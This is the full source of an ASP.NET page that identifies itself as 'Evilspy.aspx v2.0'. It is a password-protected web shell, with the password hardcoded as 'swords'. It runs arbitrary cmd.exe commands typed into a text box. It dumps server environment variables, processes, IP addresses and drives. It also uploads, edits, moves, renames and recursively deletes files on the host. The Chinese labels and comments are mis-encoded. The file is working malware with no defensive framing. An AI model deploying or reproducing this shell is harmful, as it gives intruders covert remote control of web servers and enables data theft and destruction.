   <%@page Language="VB" Debug="true" trace="false" validateRequest="false" %>
   <%@ import namespace="System.IO"%>
   <%@ import namespace="System.Net"%>
   <%@ Import Namespace="System.Diagnostics" %>
   <script runat="server">
   private PassWord as string="swords"
   dim url as string
   dim xdir  as directoryinfo
   dim xfile as fileinfo
   dim mydir as directoryInfo

   Sub Page_Load(Src as object, E as EventArgs)
       if request.QueryString("src")<>"" then
           url=request.QueryString("src")
       else
           url=server.MapPath(".") & "\"
       end if
       if session("evilspy")<>"swords" then
           call login()
       else
           Dim ex as Exception
           Try
               dim action as string=request.params("act")
               select case action
                   case "info"
                       call info()
                   case "cmdshell"
                       call cmdshell()
                   case "loginout"
                       call loginout()
                   case "filemanage"
                       call filemanage()
                   case "edit"
                       call edit()
                   case "del"
                       call del()
                   case "rename"
                       call rename()
               end select
           Catch ex
               lblerror.Text =("<font color=""red"">³öÏÖÒì³££º</font>" & ex.Message)
           End Try
       end if
   end sub

   sub login()
       panel01.visible="true"
       panel02.visible="false"
       panel03.visible="false"
   end sub

   sub loginout()
       session.abandon()
       panel01.visible="true"
   end sub

   sub filemanage()
       url=request.params("src")
       if url="" then
           url=server.mappath(".") & "\"
       end if
       panel02.visible="true"
       dir.value=url
       lblpath.text="µ±Ç°Ä¿Â¼£º"& url
   end sub

   sub edit()
       panel03.visible="true"
       if tbcontents.text="" then
           tbfile.text=request.QueryString("src")
           dim objreader as new streamreader(tbfile.text,encoding.default)
           tbcontents.text=objreader.readtoend
           objreader.close
       end if
   end sub

   sub writefile(Src As Object, E As EventArgs)
       dim objwriter as streamwriter
       if file.exists(tbfile.text) then
       objwriter=new streamwriter(tbfile.text,false,encoding.default)
       objwriter.write(tbcontents.text)
       objwriter.close
       end if
   end sub

   sub runlogin(Src As Object, E As EventArgs)
       if tbpmd.text=PassWord then
           session("evilspy")="swords"
           session.Timeout=3600 'one hour
           call filemanage()
           panel01.visible="false"
           lblerror.text=""
       else
           lblerror.text="<font color='red'>ÃÜÂë´íÎó£¡</font><br>"
       end if
   end sub

   sub info()
       lblinfo.text+=("<em>¿Í»§¶ËIP:</em>" & request.ServerVariables("REMOTE_ADDR") & "<br>")
       lblinfo.text+=("<em>¿Í»§¶Ëä¯ÀÀÆ÷:</em>" & request.ServerVariables("HTTP_USER_AGENT") & "<br>")
       lblinfo.text+=("<em>·þÎñÆ÷°æ±¾:</em> " & Environment.OSVersion.tostring() & "<br>")
       lblinfo.text+=("<em>IIS°æ±¾:</em>" & request.ServerVariables("SERVER_SOFTWARE") & "<br>")
       lblinfo.text+=("<em>·þÎñÆ÷Ãû:</em> "  &Environment.MachineName &"<br>")
       lblinfo.text+=("<em>·þÎñÆ÷IP: </em>")
       Dim addressList As IPAddress() = Dns.GetHostByName(Dns.GetHostName()).AddressList
       Dim i As Integer
       For i = 0 To addressList.Length - 1
           lblinfo.text+= addressList(i).ToString() & "<br>"
       Next i
       lblinfo.text+=("<em>·þÎñÆ÷ÔËÐÐÊ±¼ä:</em> "  &Environment.TickCount/1000/60/60 &"Ð¡Ê±<br>")
       lblinfo.text+=("<em>UserDomainName:</em> "  &Environment.UserDomainName &"<br>")
       lblinfo.text+=("<em>WorkingSet:</em> "  &Environment.WorkingSet &"<br>")
       lblinfo.text+=("<em>UserName:</em> "  &Environment.UserName &"<br>")
       lblinfo.text+=("<em>UserInteractive:</em> "  &Environment.UserInteractive &"<br>")
       lblinfo.text+=("<em>Âß¼ÅÌ  :</em> ")
       Dim drives As [String]()= Environment.GetLogicalDrives()
       Dim d As string
       For Each d In drives
               lblinfo.text+="<em> " & d & " </em>"
       next d

       lblinfo.text+=("<p><em>»·¾³±äÁ¿  :</em>")
       lblinfo.text+ = "<br>----------------------------------------------<br>"
       Dim environmentVariables As IDictionary = Environment.GetEnvironmentVariables()
       Dim de As DictionaryEntry
       For Each de In environmentVariables
               lblinfo.text+="<em>" & de.Key & ":</em>" & de.Value & "<br>"
       next de
       lblinfo.text+ = "<br>----------------------------------------------<br>"
       lblinfo.text+ ="<p><em>µ±Ç°½ø³Ì£º</em>"
       lblinfo.text+ = "<br>----------------------------------------------<br>"
       Dim p As Process
       For Each p In Process.GetProcesses()
           lblinfo.text+ = p.ToString() & "<br>"
       Next p
       lblinfo.text+ = "<br>----------------------------------------------<br>"

   end sub

   sub cmdshell()
       panel0.visible="true"
   end sub

   Sub runcmd(Src As Object, E As EventArgs)
       Dim ex as Exception
       try
           dim psi As New ProcessStartInfo("cmd.exe")
           psi.UseShellExecute = False
           psi.RedirectStandardOutput = true

           dim pro as new process()
           pro.startinfo=psi
           pro.startinfo.arguments="/c " & tbcmd.text
           pro.start()

           dim objreader as streamreader=pro.standardoutput
           lblcmd.text="<pre>" & objreader.readtoend & "</pre>"
           objreader.close()
           pro.close()
       Catch ex
           lblerror.Text =("<font color=""red"">³öÏÖÒì³££º</font>" & ex.Message)
       End Try
   End Sub

   Sub UploadFile_Clicked ( Sender as Object, e as EventArgs )
       Dim ex as Exception
       try
   ¡¡¡¡    Dim lstrFileName as string
   ¡¡¡¡    Dim lstrFileNamePath as string
   ¡¡¡¡    Dim lstrFileFolder as string

   ¡¡¡¡    if dir.value <> "" then
   ¡¡¡¡¡¡  lstrFileFolder = dir.value
   ¡¡¡¡    else
   ¡¡¡¡¡¡  lstrFileFolder = url
   ¡¡¡¡    end if

   ¡¡¡¡    ' »ñµÃÎÄ¼þÃû³Æ
   ¡¡¡¡    lstrFileName = loFile.PostedFile.FileName
   ¡¡¡¡¡¡  ' ×¢£º loFile.PostedFile.FileName ·µ»ØµÄÊÇ
   ¡¡¡¡¡¡  ' Í¨¹ýÎÄ¼þ¶Ô»°¿òÑ¡ÔñµÄÎÄ¼þÃû£¬ÕâÖ®ÖÐ°üº¬ÁËÎÄ¼þµÄÄ¿Â¼ÐÅÏ¢
   ¡¡¡¡    lstrFileName = Path.GetFileName ( lstrFileName )
   ¡¡¡¡¡¡  ' È¥µôÄ¿Â¼ÐÅÏ¢£¬·µ»ØÎÄ¼þÃû³Æ

   ¡¡¡¡    ' ÅÐ¶ÏÉÏ´«Ä¿Â¼ÊÇ·ñ´æÔÚ£¬²»´æÔÚ¾Í½¨Á¢
   ¡¡¡¡    If ( not Directory.Exists ( lstrFileFolder ) ) Then
   ¡¡¡¡¡¡  Directory.CreateDirectory ( lstrFileFolder )
   ¡¡¡¡    End If

   ¡¡¡¡¡¡  'ÉÏ´«ÎÄ¼þµ½·þÎñÆ÷
   ¡¡¡¡    lstrFileNamePath = lstrFileFolder & lstrFileName
   ¡¡¡¡¡¡  ' µÃµ½ÉÏ´«Ä¿Â¼¼°ÎÄ¼þÃû³Æ
   ¡¡¡¡    loFile.PostedFile.SaveAs ( lstrFileNamePath )

   ¡¡¡¡¡¡  ' »ñµÃ²¢ÏÔÊ¾ÉÏ´«ÎÄ¼þµÄÊôÐÔ
   ¡¡¡¡    FileName.Text = lstrFileName
   ¡¡¡¡¡¡  ' »ñµÃÎÄ¼þÃû³Æ
   ¡¡¡¡    FileType.Text = loFile.PostedFile.ContentType
   ¡¡¡¡¡¡  ' »ñµÃÎÄ¼þÀàÐÍ
   ¡¡¡¡    FileLength.Text = cStr ( loFile.PostedFile.ContentLength )
   ¡¡¡¡¡¡  ' »ñµÃÎÄ¼þ³¤¶È
   ¡¡¡¡    panel02.visible = false
   ¡¡¡¡    panel04.visible = true
   ¡¡¡¡¡¡  ' ÏÔÊ¾ÉÏ´«ÎÄ¼þÊôÐÔ
   ¡¡¡¡Catch ex
           lblerror.Text =("<font color=""red"">³öÏÖÒì³££º</font>" & ex.Message)
       End Try
   End sub


   sub del()
       dim temp as string
       temp=request.QueryString("src")
       call delfile(temp)
       lblerror.text="É¾³ýÎÄ¼þ " & temp & " ³É¹¦£¡"
   end sub

   sub delfile(temp)
       Dim ex as Exception
       try
           if right(temp,1)="\" then
               dim xdir as directoryinfo
               dim mydir as new DirectoryInfo(temp)
               dim xfile as fileinfo
               for each xfile in mydir.getfiles()
                   file.delete(temp & xfile.name)
               next
               for each xdir in mydir.getdirectories()
                   call delfile(temp & xdir.name & "\")
               next
               directory.delete(temp)
           else
               file.delete(temp)
           end if
       Catch ex
           lblerror.Text =("<font color=""red"">³öÏÖÒì³££º</font>" & ex.Message)
       End Try
   End Sub

   Sub movefile ( Sender as Object, e as EventArgs )
       Dim ex as Exception
       try
           lblpath.text= srcfile.text & "->" & desfile.text & "ÎÄ¼þµÄÒÆ¶¯¹¤×÷ÒÑ¾³É¹¦Íê³É£¡"
           File.move( srcfile.text , desfile.text )
       Catch ex
           lblerror.Text =("<font color=""red"">³öÏÖÒì³££º</font>" & ex.Message)
       End Try
   End sub

   Sub copyfile ( Sender as Object, e as EventArgs )
       Dim ex as Exception
       try
           File.copy( srcfile.text , desfile.text )
       Catch ex
           lblerror.Text =("<font color=""red"">³öÏÖÒì³££º</font>" & ex.Message)
       End Try
   End sub

   sub rename()
       url=request.QueryString("src")
       panel05.visible="true"
   end sub

   sub rename_clicked( Sender as Object, e as EventArgs )
       Dim ex as Exception
       try
           mydir=new directoryinfo(url)
           file.copy(url,mydir.parent.fullname & newfilename.text)
           call delfile(url)
           lblpath.text="ÖØÃüÃû " & replace(url,"\","\\") & " ³É¹¦£¡"
       Catch ex
           lblerror.Text =("<font color=""red"">³öÏÖÒì³££º</font>" & ex.Message)
       End Try
   end sub
   </script>

   <html><head>
   <meta http-equiv="Content-Type" content="text/html" charset=gb2312>
   <title>Test</title>
   <style type="text/css">
   A
   {
       font-family: verdana, arial, Geneva, Helvetica, sans-serif;
       color: #FAFC72;
       text-decoration: none;
   }

   A:hover
   {
       text-decoration: underline;
   }

   TD
   {
       font-family: verdana, arial, Geneva, Helvetica, sans-serif;
       font-size: 9pt;
       color: #FFFFFF;
   }

   .btn
   {
       color: #FAFC72;
       background-color: #000000;
   }

   html, body
   {
       margin:0;
       padding:0;
       color: #FAFC72;
       background-color: #000000;
   }
   </style>
   <script language="javascript">
   function del()
   {
   if(confirm("È·¶¨É¾³ýÂð£¿")){return true;}
   else{return false;}
   }
   </script>
   </head><body>
   <div style="padding:15,15,15,15;font-size:10pt;font-family:verdana";
   border-width:2px 2px 2px 2px; border-style:solid; border-color:black;">
   <p align='center'>Evilspy.aspx v2.0</p>
   <center>[<a href="?act=info">ÏµÍ³²ÎÊý</a>] | [<a href="?act=cmdshell">Net.Cmd</a>]| [<a href="?act=filemanage">ÎÄ¼þ¹ÜÀí</a>] | [<a href="javascript:history.back(1);">·µ»Ø</a>] | [<a href="?act=loginout">ÍË³ö</a>]</center>
   <hr width="90%">

   <form method = "post" enctype = "multipart/form-data" runat = "server">

   <table width="80%"  border="0" align="center">
   <asp:label id="lblinfo"  runat="server"  maintainstate="false"/><p>
   <asp:label id="lblerror"  runat="server"  maintainstate="false"/><p>
   </table>

   <asp:panel id="Panel0" runat="server"  visible="false">
   <table width="80%"  border="0" align="center">
   <asp:textbox id="tbcmd"  width="30%" runat="server"/>
   <asp:button id="btcmd" text="runcmd" class="btn" onclick="runcmd" runat="server"/></center><br>
   <asp:label id="lblcmd" runat="server"/>
   </table>
   </asp:panel>

   <asp:panel id="panel01" runat="server"  visible="false">
   <center><asp:textbox id="tbpmd" textmode="password" runat="server"/>
   <asp:button id="btlogin" text="Login" class="btn" onclick="runlogin" runat="server"/></center>
   </asp:panel>

   <asp:panel id="panel02" runat="server"  visible="false">
   <table width="80%"  border="0" align="center">
   <asp:label id="lblpath" runat="server"/>
       <tr>ÎÄ¼þÉÏ´«£º<br>
   ¡¡Ñ¡ÔñÎÄ¼þ£º<input id = "loFile" type = "file" runat = "server" > <br >
   ¡¡ÉÏ´«Ä¿Â¼£º<input id = "dir" type = "text" runat = "server" >
   ¡¡<input type = "submit" class="btn" value = "ÉÏ´«ÎÄ¼þ" OnServerClick = "UploadFile_Clicked" runat = "server" >
   ¡¡<br >
       </tr>
       <hr>
       <tr>ÎÄ¼þÒÆ¶¯/¿½±´£º<br>
   ¡¡Ô´µØÖ·£º <asp:textbox id="srcfile"  width="90%" runat="server" /><br >
   ¡¡Ä¿µÄµØÖ·£º<asp:textbox id="desfile"  width="90%" runat="server" /><br>
     <asp:button id="btmove" text="ÒÆ¶¯" class="btn"¡¡OnServerClick = "moveFile" runat = "server"/>
   ¡¡<asp:button id="btcopy" text="¿½±´" class="btn"¡¡OnServerClick = "copyFile" runat = "server"/>
   ¡¡<br >
       </tr>
       <hr>
       <tr>
           <td width="15%"><strong>Ãû³Æ</strong></td>
           <td width="10%"><strong>´óÐ¡(byte)</strong></td>
           <td width="10%"><strong>´´½¨Ê±¼ä</strong></td>
           <td width="10%"><strong>ÐÞ¸ÄÊ±¼ä</strong></td>
           <td width="10%"><strong>·ÃÎÊÊ±¼ä</strong></td>
           <td width="25%"><strong>²Ù×÷</strong></td>
       </tr>
       <tr>
          <td>
           <%
           mydir=new directoryinfo(url)
           dim panel02info as string= "<tr><td><a href='?act=filemanage&src=" & server.urlencode(mydir.parent.fullname) &  "\'>¸¸Ä¿Â¼..</a></td></tr>"
           response.Write(panel02info)

           for each xdir in mydir.getdirectories
               response.Write("<tr>")
               dim filepath as string
               filepath=server.UrlEncode(url & xdir.name)
               panel02info= "<td><a href='?act=filemanage&src=" & filepath & "\" & "'>" & xdir.name & "</a></td>"
               response.Write(panel02info)
               response.Write("<td>&lt;dir&gt;</td>")

               response.Write("<td>" & Directory.GetCreationTime(url & xdir.name) & "</td>")
               response.Write("<td>" & Directory.GetLastWriteTime(url & xdir.name) & "</td>")
               response.Write("<td>" & Directory.GetlastAccessTime(url & xdir.name) & "</td>")

               panel02info="<td><a href='?act=del&src=" & filepath & "\'" & " onclick='return del(this);'>É¾³ý</a></td>"
               response.Write(panel02info)
               response.Write("</tr>")
           next
           %>
           </td>
       </tr>
       <tr>
           <td>
           <%
           for each xfile in mydir.getfiles()
               dim filepath2 as string
               filepath2=server.UrlEncode(url & xfile.name)
               response.Write("<tr>")
               panel02info="<td>" & xfile.name & "</td>"
               response.Write(panel02info)
               panel02info="<td>" & xfile.length & "</td>"
               response.Write(panel02info)

               response.Write("<td>" & File.GetCreationTime(url & xfile.name) & "</td>")
               response.Write("<td>" & File.GetLastWriteTime(url & xfile.name) & "</td>")
               response.Write("<td>" & File.GetlastAccessTime(url & xfile.name) & "</td>")

               panel02info="<td><a href='?act=edit&src=" & filepath2 & "' target='_blank'>±à¼</a>|<a href='?act=rename&src=" & filepath2 & "' target='_blank'>ÖØÃüÃû</a>|<a href='?act=del&src=" & filepath2 & "' onClick='return del(this);'>É¾³ý</a></td>"
               response.Write(panel02info)
               response.Write("</tr>")
           next
           response.Write("</table>")
           %>
           </td>
       </tr>
   </table>
   </asp:panel>

   <asp:panel id="panel03" runat="server"  visible="false">
   <table width="80%"  border="0" align="center">
   Â·¾¶£º<asp:textbox id="tbfile"  width="90%" runat="server" /><p>
   ÄÚÈÝ£º<asp:textbox id="tbcontents" runat="server" textmode="multiline" columns="80" rows="20" />
   <p>
   <asp:button id="btwrite" class="btn" runat="server" onclick="writefile" text="±£´æÐÞ¸Ä"/>
   </table>
   </asp:panel>
   <ASP:panel id = "panel04" visible = " false " runat = "server">
   <table width="80%"  border="0" align="center">
   ³É¹¦ÉÏ´« <ASP:label id = "FileName" runat = "server" /> <br>
   ÎÄ¼þ´óÐ¡ <ASP:label id = "FileLength" runat = "server" /> bytes <br>
   ÎÄ¼þÀàÐÍ <ASP:label id = "FileType" runat = "server" /> <br>
   </table>
   </ASP:panel>
   <ASP:panel id = "panel05" visible = " false " runat = "server">
   <table width="80%"  border="0" align="center">
   ÐÂÎÄ¼þÃû: <ASP:textbox id = "newFileName" runat = "server" /> <br>
   <asp:button id="btrename" class="btn" runat="server" onclick="rename_clicked" text="±£´æÐÞ¸Ä"/>
   </table>
   </ASP:panel>
   </form>
   <hr width="90%">
   </div>
   </body></html>
